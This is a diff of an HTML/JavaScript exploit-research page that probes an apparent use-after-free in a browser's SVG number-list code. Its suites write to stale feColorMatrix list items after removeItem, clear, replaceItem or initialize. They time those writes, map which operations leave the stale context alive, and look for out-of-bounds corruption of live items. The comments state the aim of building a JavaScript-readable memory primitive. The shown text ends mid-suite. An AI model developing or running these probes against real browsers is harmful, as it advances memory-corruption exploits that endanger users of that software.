@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v71 — UAF vtable call side-effects + DOM leak + read primitive probe</title>
+<title>SVG UAF v72 — removeItem/clear OOB · live-list stale-item notification · context survival test</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -22,14 +22,14 @@ pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 </style>
 </head>
 <body>
-<h2>SVG UAF v71 — UAF vtable dispatch side-effects · DOM leak probe · read primitive via filter output</h2>
+<h2>SVG UAF v72 — removeItem/clear OOB · live-list stale-item notification · context survive test</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('ADR80')">ADR80: DOM attribute leak — does UAF write propagate to element.getAttribute?</button>
-  <button onclick="runSuite('ADR81')">ADR81: canvas filter output — does UAF corrupt feColorMatrix filter output?</button>
-  <button onclick="runSuite('ADR82')">ADR82: vtable null-check probe — timing + crash test of notification chain</button>
-  <button onclick="runSuite('ADR83')">ADR83: multiple orphaned TearOffs writing same freed list_A → DOM state accumulation</button>
-  <button onclick="runSuite('ADR84')">ADR84: SVGNumber m_owner stale backptr — write AFTER list replaced — what does element see?</button>
+  <button onclick="runSuite('ADR85')">ADR85: removeItem then write — notification fires on live list with stale item?</button>
+  <button onclick="runSuite('ADR86')">ADR86: clear() then write — live list, all items removed, notification OOB?</button>
+  <button onclick="runSuite('ADR87')">ADR87: replaceItem — swap item while holding old TearOff, fire notification</button>
+  <button onclick="runSuite('ADR88')">ADR88: context-null probe — what exactly nulls the context? (removeAttr vs setAttr vs DOM remove)</button>
+  <button onclick="runSuite('ADR89')">ADR89: SMIL + removeItem race — animate then removeItem then write → does SMIL read stale?</button>
   <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
@@ -77,37 +77,25 @@ function f32bits(f){_dv.setFloat32(0,f,true);return _dv.getUint32(0,true);}
 function f32hex(f){return'0x'+f32bits(f).toString(16).padStart(8,'0');}
 
 function gcHard(){
-  var a=[];for(var i=0;i<500000;i++)a.push({x:i});a=null;
-  var t=new Array(200000).fill(null).map(function(){return{};});t=null;
-  try{var ab=new ArrayBuffer(1024*1024*8);ab=null;}catch(e){}
+  var a=[];for(var i=0;i<300000;i++)a.push({x:i});a=null;
+  try{var ab=new ArrayBuffer(1024*1024*4);ab=null;}catch(e){}
 }
 function gcDOM(){
   var c=document.createElement('div');document.body.appendChild(c);
-  for(var i=0;i<5000;i++){var el=document.createElement('span');c.appendChild(el);}
+  for(var i=0;i<2000;i++){var el=document.createElement('span');c.appendChild(el);}
   c.innerHTML='';c.remove();
-  for(var j=0;j<300;j++){var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);s.remove();}
 }
 function gcFull(){gcHard();gcDOM();gcHard();}
 
-// Make feColorMatrix inside an SVG, return refs
-function makeFe(id,vals20){
-  var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','100');svg.setAttribute('height','100');
-  document.body.appendChild(svg);
-  var filter=document.createElementNS(SVG_NS,'filter');
-  filter.id='flt_'+id;
-  svg.appendChild(filter);
+function makeFe(id,vals){
+  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
   var fe=document.createElementNS(SVG_NS,'feColorMatrix');
   fe.setAttribute('type','matrix');
-  fe.setAttribute('values',vals20.join(' '));
-  filter.appendChild(fe);
-  return{svg:svg,filter:filter,fe:fe};
+  fe.setAttribute('values',vals.join(' '));
+  svg.appendChild(fe);
+  return{svg:svg,fe:fe};
 }
-
-// Parse feColorMatrix values string to array of numbers
-function parseVals(attrStr){
-  return attrStr.trim().split(/\s+/).map(Number);
-}
+function initVals(n,fn){var a=[];for(var i=0;i<n;i++)a.push(fn?fn(i):0);return a;}
 
 var suites={};
 function runSuite(name){
@@ -116,570 +104,498 @@ function runSuite(name){
   catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}
 }
 function runAll(){
-  ['ADR80','ADR81','ADR82','ADR83','ADR84'].forEach(function(n){runSuite(n);});
+  ['ADR85','ADR86','ADR87','ADR88','ADR89'].forEach(function(n){runSuite(n);});
 }
 
 // ═══════════════════════════════════════════════════════════════
-// ADR80 — DOM ATTRIBUTE LEAK
+// ADR85 — removeItem THEN WRITE
 //
-// QUESTION: After orphanedTearOff.value = X (UAF write → notification fires
-// on freed list_A), does element.getAttribute('values') or the live baseVal
-// reflect the write?
+// Key insight: setAttributeNS nulls TearOff context AND frees the list.
+// But removeItem() keeps the list alive and only removes an item.
+// Does the TearOff's context survive removeItem?
 //
-// If itemChanged() on freed list_A runs (vtable intact), it calls:
-//   commitChange() → element.svgAttributeChanged() → element updates its
-//   values representation
+// If yes: notification from T_old.value = X fires on LIVE list with STALE item.
+// The list.itemChanged(staleItem) must locate staleItem in its vector.
+// If staleItem was removed: indexOf = -1 → OOB or undefined behavior?
 //
-// The element's 'values' attr is now tied to list_B (after setAttributeNS).
-// BUT: if freed list_A's itemChanged propagates back to the element and
-// confuses the element into thinking list_A changed → might element reflect
-// list_A's old/freed data in getAttribute('values')?
+// Setup: 20-item list. Grab T_old = getItem(0). removeItem(0) removes index 0.
+// All items shift down. Now list has 19 items. T_old still refs old SVGNumber_old.
+// SVGNumber_old.m_owner = LIVE list.
+// Write T_old.value = X → notification → list.itemChanged(SVGNumber_old).
 //
-// Also test: does animVal (SMIL) react to the notification from freed list_A?
-// animVal reads from SMIL's own data, so probably not.
-//
-// Setup:
-// 1. Create feColorMatrix with values = [3.14, 0, ..., 0] (20 values)
-// 2. Get orphaned TearOff T_old pointing to SVGNumber_old in freed list_A
-// 3. setAttributeNS with new values = [0, 0, ..., 0]
-// 4. Record baseline: elem.getAttribute('values'), baseVal.getItem(0).value
-// 5. Write T_old.value = 99.99 → UAF notification fires
-// 6. Record after: elem.getAttribute('values'), baseVal.getItem(0).value
-// 7. Any change = DOM leaked freed list_A data
+// Checks:
+// 1. getAttribute after write — did it change?
+// 2. baseVal values — any OOB corruption of remaining 19 items?
+// 3. Timing — is the write slow (vtable dispatch fires) or fast (null-check exit)?
+// 4. numberOfItems — still 19?
+// 5. Item values — any shifted incorrectly?
 // ═══════════════════════════════════════════════════════════════
-suites['ADR80']=function(){
-  L('ADR80: DOM attribute leak — does UAF notification update element.getAttribute?','info');
+suites['ADR85']=function(){
+  L('ADR85: removeItem(0) then write to stale TearOff — notification on live list','info');
 
-  // Create victim with distinctive initial values
-  var initVals=[];
-  for(var i=0;i<20;i++) initVals.push(i===0?3.14:i*0.1);
-  var o80=makeFe('80a',initVals);
-  L('ADR80: initial values[0]='+o80.fe.values.baseVal.getItem(0).value.toFixed(4),'info');
-  L('ADR80: initial getAttribute='+o80.fe.getAttribute('values').substring(0,40)+'...','info');
+  var vals85=initVals(20,function(i){return (i+1)*100;});
+  var o85=makeFe('85',vals85);
+  var bv85=o85.fe.values.baseVal;
 
-  // Grab orphaned TearOff
-  var T80=o80.fe.values.baseVal.getItem(0);
-  L('ADR80: T80.value='+T80.value.toFixed(4)+' (pre-setAttr)','info');
+  // Grab TearOff for item 0
+  var T85=bv85.getItem(0);
+  L('ADR85: T85.value='+T85.value+' (should be 100)','info');
 
-  // setAttributeNS → frees list_A, creates list_B with all zeros
-  var zeros20=[];for(var i=0;i<20;i++)zeros20.push(0);
-  o80.fe.setAttributeNS(null,'values',zeros20.join(' '));
+  // Baseline: record all 20 item values
+  var baseline85=[];
+  for(var i=0;i<20;i++) baseline85.push(bv85.getItem(i).value);
+  L('ADR85: baseline[0..4]='+baseline85.slice(0,5).join(','),'info');
 
-  // Baseline after setAttr
-  var baseline_attr=o80.fe.getAttribute('values');
-  var baseline_bv0=o80.fe.values.baseVal.getItem(0).value;
-  L('ADR80: BASELINE after setAttr:','info');
-  L('  getAttribute='+baseline_attr.substring(0,50)+'...','info');
-  L('  baseVal[0]='+baseline_bv0+' (should be 0)','info');
-  L('  T80.value='+T80.value.toFixed(4)+' (orphaned, still '+initVals[0].toFixed(4)+'?)','info');
+  // removeItem(0) — removes index 0, shifts everything down
+  var removed85=bv85.removeItem(0);
+  L('ADR85: removed item value='+removed85.value+' (should be 100)','info');
+  L('ADR85: after removeItem: numberOfItems='+bv85.numberOfItems+' (should be 19)','info');
+  L('ADR85: bv[0] after remove='+bv85.getItem(0).value+' (should be 200, shifted down)','info');
+  L('ADR85: T85.value after remove='+T85.value+' (still reads 100 from stale SVGNumber)','info');
 
-  // UAF write — various values to test
-  var writeValues=[99.99, 12345.678, -7777.7, 0.000001];
-  writeValues.forEach(function(wv,wi){
-    L('ADR80: writing T80.value='+wv+' (attempt '+wi+')','warn');
-    try{T80.value=wv;}catch(e){L('  write threw: '+e.message,'miss');return;}
+  // Record post-remove state
+  var postRemove=[];
+  for(var i=0;i<bv85.numberOfItems;i++) postRemove.push(bv85.getItem(i).value);
 
-    var after_attr=o80.fe.getAttribute('values');
-    var after_bv0=o80.fe.values.baseVal.getItem(0).value;
-    var attr_changed=(after_attr!==baseline_attr);
-    var bv_changed=(Math.abs(after_bv0-baseline_bv0)>0.0001);
+  // Time the write to stale TearOff
+  var ITER=200;
+  var t0=performance.now();
+  for(var i=0;i<ITER;i++) T85.value=i*0.1+999;
+  var t1=performance.now();
+  var time_stale=t1-t0;
+  L('ADR85: stale TearOff write: '+ITER+' writes → '+time_stale.toFixed(2)+'ms ('+((time_stale/ITER)*1000).toFixed(1)+'µs/write)','info');
 
-    if(attr_changed){
-      L('★★★ ADR80: getAttribute CHANGED after UAF write!','hit');
-      L('  before='+baseline_attr.substring(0,50),'hit');
-      L('  after='+after_attr.substring(0,50),'hit');
-    } else {
-      L('  getAttribute: unchanged (UAF notification did NOT update attribute)','info');
+  // Time write to LIVE TearOff (still in list)
+  var T85_live=bv85.getItem(0);
+  var t2=performance.now();
+  for(var i=0;i<ITER;i++) T85_live.value=i*0.1+200;
+  var t3=performance.now();
+  var time_live=t3-t2;
+  L('ADR85: live TearOff write: '+ITER+' writes → '+time_live.toFixed(2)+'ms ('+((time_live/ITER)*1000).toFixed(1)+'µs/write)','info');
+  var ratio=time_stale/time_live;
+  L('ADR85: ratio stale/live='+ratio.toFixed(3),'info');
+
+  if(ratio<0.1){
+    L('★★★ ADR85: stale write near-zero → null-check exits immediately (context nulled on removeItem)','hit');
+  } else if(ratio>2.0){
+    L('★★★ ADR85: stale write SLOWER → vtable dispatch firing on live list with stale item!','hit');
+  } else {
+    L('ADR85: stale write similar speed ('+ratio.toFixed(2)+'x) — notification fires or slight overhead','warn');
+  }
+
+  // Check for DOM changes after stale writes
+  var attr_after=o85.fe.getAttribute('values');
+  var items_after=bv85.numberOfItems;
+  var vals_after=[];
+  for(var i=0;i<items_after;i++) vals_after.push(bv85.getItem(i).value);
+
+  L('ADR85: getAttribute after stale writes='+attr_after.substring(0,50)+'...','info');
+  L('ADR85: numberOfItems='+items_after+' (should be 19)','info');
+
+  // Check if any item was corrupted by OOB write
+  var corrupted=[];
+  for(var i=0;i<Math.min(vals_after.length,postRemove.length);i++){
+    if(Math.abs(vals_after[i]-postRemove[i])>0.5 && Math.abs(vals_after[i]-200)<1){
+      // item[0] was being written to by live TearOff (200+...) — skip
+    } else if(Math.abs(vals_after[i]-postRemove[i])>0.5){
+      corrupted.push({i:i,expected:postRemove[i],got:vals_after[i]});
     }
-    if(bv_changed){
-      L('★★★ ADR80: baseVal[0] CHANGED: '+baseline_bv0+' → '+after_bv0,'hit');
-    } else {
-      L('  baseVal[0]: unchanged (='+after_bv0+')','info');
-    }
+  }
+  if(corrupted.length>0){
+    L('★★★ ADR85: '+corrupted.length+' items CORRUPTED after stale write!','hit');
+    corrupted.forEach(function(x){L('  item['+x.i+']: expected='+x.expected+' got='+x.got,'hit');});
+  } else {
+    L('ADR85: no item corruption (stale write silenced or OOB write went to unmapped region)','info');
+  }
 
-    // Check T80 itself
-    L('  T80.value after write='+T80.value.toFixed(4),'info');
-  });
+  // Special: write stale value = 77777 then check if bv[18] (last item, used to be bv[19]) = 77777
+  T85.value=77777;
+  var last_item=bv85.getItem(bv85.numberOfItems-1).value;
+  L('ADR85: wrote 77777 to stale TearOff, last_item='+last_item+' (77777 would mean OOB-1 hit)','info');
 
-  // Test with SMIL animation running → does animVal react?
-  L('ADR80-B: with SMIL animation — does animVal react to UAF notification?','info');
-  var animVals80=[];for(var i=0;i<20;i++)animVals80.push(i===0?1:0);
-  var o80b=makeFe('80b',animVals80);
-  var anim80=document.createElementNS(SVG_NS,'animate');
-  anim80.setAttribute('attributeName','values');
-  anim80.setAttribute('from',animVals80.join(' '));
-  var toVals80=[];for(var i=0;i<20;i++)toVals80.push(i===0?1000:0);
-  anim80.setAttribute('to',toVals80.join(' '));
-  anim80.setAttribute('dur','10s');
-  anim80.setAttribute('repeatCount','indefinite');
-  o80b.fe.appendChild(anim80);
-
-  var T80b=o80b.fe.values.baseVal.getItem(0);
-  var av80b_before;
-  requestAnimationFrame(function(){
-    av80b_before=o80b.fe.values.animVal.getItem(0).value;
-    L('ADR80-B: animVal before UAF write='+av80b_before.toFixed(4),'info');
-
-    // free list_A via setAttr
-    o80b.fe.setAttributeNS(null,'values',zeros20.join(' '));
-
-    // write to orphaned TearOff
-    try{T80b.value=88888;}catch(e){L('write threw: '+e,'miss');}
-
-    requestAnimationFrame(function(){
-      var av80b_after=o80b.fe.values.animVal.getItem(0).value;
-      var avChanged=(Math.abs(av80b_after-av80b_before)>0.001 && av80b_after!==88888-1 /* paranoia */);
-      L('ADR80-B: animVal after UAF write='+av80b_after.toFixed(4),'info');
-      if(Math.abs(av80b_after-88888)<1){
-        L('★★★ ADR80-B: animVal reads UAF write value! (88888 propagated)','hit');
-      } else if(avChanged){
-        L('ADR80-B: animVal changed but not to write value: '+av80b_after.toFixed(4),'warn');
-      } else {
-        L('ADR80-B: animVal unchanged (SMIL ignores freed list notification)','info');
-      }
-      o80b.svg.remove();
-    });
-  });
-
-  o80.svg.remove();
+  o85.svg.remove();
 };
 
 // ═══════════════════════════════════════════════════════════════
-// ADR81 — CANVAS FILTER OUTPUT CORRUPTION
+// ADR86 — clear() THEN WRITE
 //
-// If the UAF notification fires on freed list_A AND somehow propagates
-// to the element's filter pipeline, the feColorMatrix would apply
-// corrupted matrix values to the pixel data.
+// bv.clear() removes ALL items from the list. List object stays alive.
+// WTF::Vector::clear() → calls destructors on all items but keeps buffer.
+// TearOffs still reference their SVGNumbers (RefPtr keeps them alive).
+// SVGNumber.m_owner = LIVE but empty list.
+//
+// After clear(): bv.numberOfItems = 0
+// Write T_old.value = X → notification → list.itemChanged(SVGNumber_old)
+// itemChanged on an EMPTY list? indexOf(SVGNumber_old) = -1?
+//
+// If the code does something like:
+//   size_t index = m_values.find(item);
+//   m_values[index] = newValue;  ← OOB if index = notFound (-1 as size_t = HUGE)
+//
+// Different implementations:
+// A) Safe: indexOf check → not found → return early
+// B) Unsafe: assume item is in list → OOB read/write
+//
+// This is the core OOB test.
+// ═══════════════════════════════════════════════════════════════
+suites['ADR86']=function(){
+  L('ADR86: clear() then write — OOB notification on empty live list','info');
+
+  var vals86=initVals(20,function(i){return (i+1)*111;});
+  var o86=makeFe('86',vals86);
+  var bv86=o86.fe.values.baseVal;
+
+  // Grab TearOff for item 5 (middle)
+  var T86=bv86.getItem(5);
+  L('ADR86: T86.value='+T86.value+' (should be 666)','info');
+
+  // Also grab a sentinel TearOff for a different position
+  var T86_sentinel=bv86.getItem(10);
+  L('ADR86: T86_sentinel.value='+T86_sentinel.value+' (should be 1221)','info');
+
+  // clear() — removes all items, list stays alive
+  bv86.clear();
+  L('ADR86: after clear(): numberOfItems='+bv86.numberOfItems+' (should be 0)','info');
+  L('ADR86: T86.value after clear='+T86.value+' (still reads 666 from stale SVGNumber)','info');
+
+  // Time the write to stale TearOff (post-clear)
+  var ITER=200;
+  var t0=performance.now();
+  for(var i=0;i<ITER;i++) T86.value=i*0.1+5000;
+  var t1=performance.now();
+  var time_stale=t1-t0;
+  L('ADR86: stale TearOff write (post-clear): '+time_stale.toFixed(2)+'ms for '+ITER+' writes','info');
+  L('ADR86: µs/write = '+((time_stale/ITER)*1000).toFixed(1)+'µs','info');
+
+  if(time_stale<0.1){
+    L('★★★ ADR86: near-ZERO ms → null-check exits immediately (context nulled on clear!)','hit');
+  } else {
+    L('ADR86: non-zero time → notification is FIRING on the empty list','warn');
+  }
+
+  // Check getAttribute after writes
+  var attr_after86=o86.fe.getAttribute('values');
+  L('ADR86: getAttribute after stale writes='+attr_after86.substring(0,60),'info');
+  L('ADR86: numberOfItems after writes='+bv86.numberOfItems,'info');
+
+  // Write extreme value and check if list somehow grew (impossible, but check)
+  T86.value=999999;
+  L('ADR86: after writing 999999: numberOfItems='+bv86.numberOfItems+' (still 0 expected)','info');
+  if(bv86.numberOfItems>0){
+    L('★★★ ADR86: numberOfItems > 0 after stale write on empty list! OOB!','hit');
+    for(var i=0;i<bv86.numberOfItems;i++) L('  item['+i+']='+bv86.getItem(i).value,'warn');
+  }
+
+  // T86_sentinel check
+  L('ADR86: T86_sentinel.value='+T86_sentinel.value+' (should still be 1221)','info');
+
+  o86.svg.remove();
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR87 — replaceItem THEN WRITE OLD TEAROFF
+//
+// replaceItem(newItem, index) replaces item at index with newItem.
+// The OLD item at index is returned. It is no longer in the list.
+// BUT: T_old still holds RefPtr to it. m_owner = LIVE list.
+//
+// After replaceItem: old SVGNumber has m_owner = LIVE list but is no longer IN list.
+// Writing to T_old triggers notification → same OOB path as removeItem.
+//
+// Extra test: replaceItem at index 0, so new item is at index 0.
+// Old item was at 0, now replaced. Write old → list.itemChanged(old).
+// Does list find old at index 0? No — new item is there now.
+// Does list write to index 0 anyway (using stale index assumption)?
+// → That would be a write to NEW item's memory via OOB (interesting!)
+//
+// If list.itemChanged() uses a "position hint" stored in the SVGNumber itself
+// (SVGNumber might store its own index in the list), we could have:
+//   old.m_listIndex = 0 (stored when item was added at index 0)
+//   list.m_values[0] = newItem (after replaceItem)
+//   notification: list.m_values[old.m_listIndex] = X → writes to new item's slot!
+//   → corrupts new item's value → JS readable!
+// ═══════════════════════════════════════════════════════════════
+suites['ADR87']=function(){
+  L('ADR87: replaceItem — write to old TearOff after item replaced in list','info');
+
+  var vals87=initVals(20,function(i){return (i+1)*222;});
+  var o87=makeFe('87',vals87);
+  var bv87=o87.fe.values.baseVal;
+
+  // Grab item 0 TearOff
+  var T87_old=bv87.getItem(0);
+  L('ADR87: T87_old.value='+T87_old.value+' (index 0, should be 222)','info');
+
+  // Create a new SVGNumber to replace with
+  // We need an SVGNumber TearOff — we can use a new list's item
+  var o87b=makeFe('87b',initVals(20,function(i){return 9000+(i+1)*10;}));
+  var T87_new_source=o87b.fe.values.baseVal.getItem(0);
+  L('ADR87: T87_new_source.value='+T87_new_source.value+' (should be 9010)','info');
+
+  // replaceItem(newItem, index) — replace index 0 with new item
+  // Parameter order in DOM: replaceItem(newItem, index)
+  var replaced87;
+  try{
+    replaced87=bv87.replaceItem(T87_new_source,0);
+    L('ADR87: replaceItem succeeded. replaced87.value='+replaced87.value,'info');
+    L('ADR87: bv87.getItem(0).value='+bv87.getItem(0).value+' (should be 9010 or similar)','info');
+  }catch(e){
+    L('ADR87: replaceItem threw: '+e.message,'miss');
+    // Try alternative: replaceItem(item, index)
+    try{
+      var newSVGNum=bv87.appendItem(T87_new_source);
+      L('ADR87: appendItem succeeded. numberOfItems='+bv87.numberOfItems,'info');
+    }catch(e2){L('ADR87: appendItem also threw: '+e2.message,'miss');}
+  }
+
+  L('ADR87: T87_old.value after replaceItem='+T87_old.value,' info');
+  L('ADR87: T87_old is in list? checking by value...','info');
+  var inList=false;
+  for(var i=0;i<bv87.numberOfItems;i++){
+    if(Math.abs(bv87.getItem(i).value-T87_old.value)<0.5){inList=true;break;}
+  }
+  L('ADR87: T87_old still in list? '+inList,'info');
+
+  // Time write to old TearOff (replaced, no longer in list)
+  var ITER=200;
+  var t0=performance.now();
+  for(var i=0;i<ITER;i++) T87_old.value=i*0.1+77777;
+  var t1=performance.now();
+  var time87=t1-t0;
+  L('ADR87: stale (replaced) TearOff write: '+time87.toFixed(2)+'ms for '+ITER+' writes','info');
+
+  // Check new item at index 0 — was it corrupted by stale write?
+  var new_item_val=bv87.getItem(0).value;
+  L('ADR87: bv87[0].value after stale writes='+new_item_val+' (corruption check)','info');
+  if(new_item_val>77770 && new_item_val<77780){
+    L('★★★ ADR87: new item at index 0 was CORRUPTED by stale TearOff write! OOB CONFIRMED!','hit');
+  } else if(new_item_val!==bv87.getItem(0).value){
+    L('ADR87: item[0] value unexpected: '+new_item_val,'warn');
+  }
+
+  // Check getAttribute
+  var attr87=o87.fe.getAttribute('values');
+  L('ADR87: getAttribute after stale writes: '+attr87.substring(0,60)+'...','info');
+
+  o87.svg.remove();o87b.svg.remove();
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR88 — CONTEXT-NULL PROBE
+//
+// From ADR82: orphan write (post-setAttributeNS) = 0ms (context nulled).
+// From ADR85: what happens post-removeItem?
+//
+// This suite systematically tests WHICH operations null the TearOff context:
+//
+// Operations to test (each timed):
+// A. setAttributeNS → context null (ADR82: confirmed 0ms)
+// B. removeAttribute → does this free the list AND null context?
+// C. feElement.remove() → removing element from DOM → does context survive?
+// D. svg.remove() → removing parent SVG from DOM → does context survive?
+// E. bv.removeItem(0) → remove item, keep list → does context survive?
+// F. bv.clear() → clear all items → does context survive?
+// G. bv.initialize(newItem) → replaces all items with one → does context survive?
+//
+// For each: grab TearOff, perform operation, time 200 writes to TearOff.
+// 0ms = context nulled (same as ADR82 = no notification)
+// Non-zero ms = notification still fires (context survived)
+// ═══════════════════════════════════════════════════════════════
+suites['ADR88']=function(){
+  L('ADR88: context-null probe — which operations null the TearOff context?','info');
+
+  var ITER=200;
+
+  function timeTearoffWrites(T,label){
+    var t0=performance.now();
+    for(var i=0;i<ITER;i++) T.value=i*0.001+1;
+    var t1=performance.now();
+    var ms=t1-t0;
+    var us=(ms/ITER)*1000;
+    L('  '+label+': '+ms.toFixed(2)+'ms ('+us.toFixed(1)+'µs/write)'+(ms<0.1?' ← ZERO (context nulled)':ms>0.5?' ← SLOW (notification fires!)':' ← borderline'),'info');
+    return ms;
+  }
+
+  // Baseline: live TearOff
+  var bsVals=initVals(20,function(i){return (i+1)*10;});
+  var oBS=makeFe('88_bs',bsVals);
+  var T_bs=oBS.fe.values.baseVal.getItem(0);
+  var baseline=timeTearoffWrites(T_bs,'BASELINE (live)');
+  oBS.svg.remove();
+
+  // A: setAttributeNS (ADR82 baseline = 0ms)
+  var oA=makeFe('88A',bsVals);
+  var TA=oA.fe.values.baseVal.getItem(0);
+  oA.fe.setAttributeNS(null,'values',bsVals.join(' '));
+  var timeA=timeTearoffWrites(TA,'A: setAttributeNS');
+  if(timeA<0.1) L('  → setAttributeNS nulled context (confirmed ADR82)','info');
+  oA.svg.remove();
+
+  // B: removeAttribute
+  var oB=makeFe('88B',bsVals);
+  var TB=oB.fe.values.baseVal.getItem(0);
+  try{oB.fe.removeAttribute('values');}catch(e){L('  B: removeAttribute threw: '+e.message,'miss');}
+  var timeB=timeTearoffWrites(TB,'B: removeAttribute');
+  if(timeB<0.1) L('  → removeAttribute nulled context','info');
+  else if(timeB>baseline*0.5) L('  ★★★ B: removeAttribute SURVIVED → notification still fires!','hit');
+  oB.svg.remove();
+
+  // C: feElement.remove() from parent (but parent SVG stays in DOM)
+  var oC=makeFe('88C',bsVals);
+  var TC=oC.fe.values.baseVal.getItem(0);
+  oC.fe.remove();// remove feColorMatrix from SVG, SVG stays
+  var timeC=timeTearoffWrites(TC,'C: feElement.remove() [fe out of DOM]');
+  if(timeC<0.1) L('  → fe.remove() nulled context','info');
+  else if(timeC>baseline*0.5) L('  ★★★ C: fe.remove() SURVIVED → notification still fires!','hit');
+  oC.svg.remove();
+
+  // D: svg.remove() from body
+  var oD=makeFe('88D',bsVals);
+  var TD=oD.fe.values.baseVal.getItem(0);
+  oD.svg.remove();// remove entire SVG from DOM
+  var timeD=timeTearoffWrites(TD,'D: svg.remove() [entire SVG out of DOM]');
+  if(timeD<0.1) L('  → svg.remove() nulled context','info');
+  else if(timeD>baseline*0.5) L('  ★★★ D: svg.remove() SURVIVED → notification fires even out of DOM!','hit');
+
+  // E: bv.removeItem(0) — from ADR85, get detailed timing
+  var oE=makeFe('88E',bsVals);
+  var TE=oE.fe.values.baseVal.getItem(0);
+  oE.fe.values.baseVal.removeItem(0);
+  var timeE=timeTearoffWrites(TE,'E: bv.removeItem(0)');
+  if(timeE<0.1) L('  → removeItem nulled context','info');
+  else if(timeE>baseline*0.5) L('  ★★★ E: removeItem SURVIVED → notification fires on live list with stale item!','hit');
+  oE.svg.remove();
+
+  // F: bv.clear() — from ADR86
+  var oF=makeFe('88F',bsVals);
+  var TF=oF.fe.values.baseVal.getItem(5);
+  oF.fe.values.baseVal.clear();
+  var timeF=timeTearoffWrites(TF,'F: bv.clear()');
+  if(timeF<0.1) L('  → clear() nulled context','info');
+  else if(timeF>baseline*0.5) L('  ★★★ F: clear() SURVIVED → notification fires on empty list!','hit');
+  oF.svg.remove();
+
+  // G: bv.initialize(newItem) — replaces all with one item
+  var oG=makeFe('88G',bsVals);
+  var TG=oG.fe.values.baseVal.getItem(5);// grab item 5
+  var T_init_src=makeFe('88G_src',initVals(20,function(i){return 5555;}));
+  var newSingle=T_init_src.fe.values.baseVal.getItem(0);
+  try{
+    oG.fe.values.baseVal.initialize(newSingle);
+    L('  G: initialize succeeded. numberOfItems='+oG.fe.values.baseVal.numberOfItems,'info');
+    var timeG=timeTearoffWrites(TG,'G: bv.initialize(newItem)');
+    if(timeG<0.1) L('  → initialize nulled context for old item','info');
+    else if(timeG>baseline*0.5) L('  ★★★ G: initialize SURVIVED → notification fires on replaced-list with stale item!','hit');
+  }catch(e){L('  G: initialize threw: '+e.message,'miss');}
+  oG.svg.remove();T_init_src.svg.remove();
+
+  // Summary
+  L('ADR88: baseline='+baseline.toFixed(2)+'ms A='+timeA.toFixed(2)+'ms B='+timeB.toFixed(2)+'ms C='+timeC.toFixed(2)+'ms D='+timeD.toFixed(2)+'ms E='+timeE.toFixed(2)+'ms F='+timeF.toFixed(2)+'ms','info');
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR89 — SMIL + removeItem RACE
+//
+// When SMIL is animating a feColorMatrix:
+// SMIL holds RefPtr to an animated SVGNumber.
+// The animated value is stored in an SMIL-managed list (animVal).
+//
+// What if we removeItem from the SMIL-managed animVal list?
+// (animVal is normally read-only, but maybe we can bypass via the SVG DOM?)
+//
+// Actually: SVGNumberList for animVal is separate from baseVal.
+// We can only removeItem from baseVal. SMIL's animVal is separate.
+//
+// BUT: what if we removeItem from baseVal WHILE SMIL is animating?
+// SMIL's animation is based on baseVal's initial values.
+// After removeItem: baseVal shrinks. SMIL might try to interpolate
+// from a now-shorter list → OOB access in SMIL's "from" values array?
 //
 // Test:
-// 1. Create SVG with feColorMatrix filter applied to a rect
-// 2. Read canvas pixel output before UAF write (record RGBA)
-// 3. Trigger UAF write: T_old.value = X (large value like 99999)
-// 4. Read canvas pixel output after UAF write
-// 5. Any pixel change = filter pipeline used freed list_A data
+// 1. Set up SMIL animation on feColorMatrix (animates values 0..20)
+// 2. While animation is running, removeItem(0) from baseVal
+// 3. Continue animation for several frames
+// 4. Check if animVal shows any OOB values
+// 5. Check if element stays stable or shows corruption
 //
-// This is the most sensitive indicator: even a 1-bit change in any
-// pixel component would confirm the filter used corrupted matrix values.
-//
-// Note: we need to render the SVG to canvas. On iOS, cross-origin canvas
-// taint might apply to SVG. Use an inline SVG on canvas.
+// Also: while SMIL animates, call bv.insertItemBefore(item, 0) to ADD an item
+// at the beginning. This shifts all indices. SMIL might be indexing with stale
+// positions → OOB read from shifted array.
 // ═══════════════════════════════════════════════════════════════
-suites['ADR81']=function(){
-  L('ADR81: canvas filter pixel output — does UAF corrupt feColorMatrix rendering?','info');
+suites['ADR89']=function(){
+  L('ADR89: SMIL + removeItem — does mid-animation removeItem cause OOB in SMIL interpolation?','info');
 
-  // Create SVG with filter
-  var svg81=document.createElementNS(SVG_NS,'svg');
-  svg81.setAttribute('xmlns',SVG_NS);
-  svg81.setAttribute('width','50');svg81.setAttribute('height','50');
-  document.body.appendChild(svg81);
+  var from89=initVals(20,function(i){return i===0?0:0;});
+  var to89=initVals(20,function(i){return i===0?1000:0;});
+  var o89=makeFe('89',from89);
+  var fe89=o89.fe;
 
-  var defs81=document.createElementNS(SVG_NS,'defs');
-  svg81.appendChild(defs81);
-  var filter81=document.createElementNS(SVG_NS,'filter');
-  filter81.id='flt81';
-  defs81.appendChild(filter81);
+  // Add SMIL animation
+  var anim89=document.createElementNS(SVG_NS,'animate');
+  anim89.setAttribute('attributeName','values');
+  anim89.setAttribute('from',from89.join(' '));
+  anim89.setAttribute('to',to89.join(' '));
+  anim89.setAttribute('dur','5s');
+  anim89.setAttribute('repeatCount','indefinite');
+  fe89.appendChild(anim89);
 
-  var fe81=document.createElementNS(SVG_NS,'feColorMatrix');
-  fe81.setAttribute('type','matrix');
-  // Identity matrix
-  var identity=[1,0,0,0,0, 0,1,0,0,0, 0,0,1,0,0, 0,0,0,1,0];
-  fe81.setAttribute('values',identity.join(' '));
-  filter81.appendChild(fe81);
+  var frameCount=0;
+  var results89=[];
+  var oobDetected=false;
 
-  var rect81=document.createElementNS(SVG_NS,'rect');
